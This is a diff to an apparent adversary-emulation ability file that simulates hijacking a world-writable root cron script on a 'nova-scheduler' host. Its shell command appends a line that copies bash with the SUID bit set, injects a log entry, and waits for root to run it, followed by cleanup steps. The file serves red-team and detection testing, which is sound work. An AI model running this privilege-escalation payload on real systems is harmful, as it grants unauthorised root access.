@@ -1,4 +1,5 @@
 - name: 'NovaTech: World-Writable Cron Script Hijacking'
+  id: d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9
   description: >-
     Simulates an attacker discovering and modifying a world-writable cron script
     executed by root. Appends a payload to copy bash with SUID permissions,
@@ -11,37 +12,36 @@
   repeatable: false
   delete_payload: false
   executors:
-  - name: sh
-    platform: linux
-    command: >-
-      echo "[*] Simulating cron script hijacking on nova-scheduler";
-      echo "[*] Checking world-writable scripts in cron context";
-      stat /opt/scripts/maintenance.sh 2>/dev/null | grep -E "Access|Uid";
-      ls -la /opt/scripts/maintenance.sh 2>/dev/null;
-      echo "[*] Appending SUID bash copy payload to cron script";
-      echo 'cp /bin/bash /tmp/.suid_bash_sim; chmod +s /tmp/.suid_bash_sim' >> /opt/scripts/maintenance.sh;
-      echo "[!] Cron script modified by attacker at $(date)" >> /var/log/syslog;
-      echo "[*] Waiting up to 65 seconds for root cron execution";
-      for i in $(seq 1 65); do
-        if [ -f /tmp/.suid_bash_sim ] && [ -u /tmp/.suid_bash_sim ]; then
-          echo "[✓] SUID bash created by root cron at second $i";
-          ls -la /tmp/.suid_bash_sim;
-          break;
-        fi;
-        sleep 1;
-      done;
-      echo "[*] Cron hijack simulation complete"
-    code: null
-    language: null
-    build_target: null
-    payloads: []
-    uploads: []
-    timeout: 120
-    parsers: []
-    cleanup:
-    - rm -f /tmp/.suid_bash_sim
-    - sed -i '/suid_bash_sim/d' /opt/scripts/maintenance.sh
-    variations: []
-    additional_info: {}
+    - name: sh
+      platform: linux
+      command: |
+        echo "[*] Simulating cron script hijacking on nova-scheduler"
+        echo "[*] Checking world-writable scripts in cron context"
+        stat /opt/scripts/maintenance.sh 2>/dev/null | grep -E "Access|Uid"
+        ls -la /opt/scripts/maintenance.sh 2>/dev/null
+        echo "[*] Appending SUID bash copy payload to cron script"
+        echo 'cp /bin/bash /tmp/.suid_bash_sim; chmod +s /tmp/.suid_bash_sim' >> /opt/scripts/maintenance.sh
+        echo "[!] Cron script modified by attacker at $(date)" >> /var/log/syslog
+        echo "[*] Waiting up to 65 seconds for root cron execution"
+        for i in $(seq 1 65); do
+          if [ -f /tmp/.suid_bash_sim ] && [ -u /tmp/.suid_bash_sim ]; then
+            echo "[✓] SUID bash created by root cron at second $i"
+            ls -la /tmp/.suid_bash_sim
+            break
+          fi
+          sleep 1
+        done
+        echo "[*] Cron hijack simulation complete"
+      code: null
+      language: null
+      build_target: null
+      payloads: []
+      uploads: []
+      timeout: 120
+      parsers: []
+      cleanup:
+        - rm -f /tmp/.suid_bash_sim
+        - sed -i '/suid_bash_sim/d' /opt/scripts/maintenance.sh
+      variations: []
+      additional_info: {}
   requirements: []
-  id: d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9
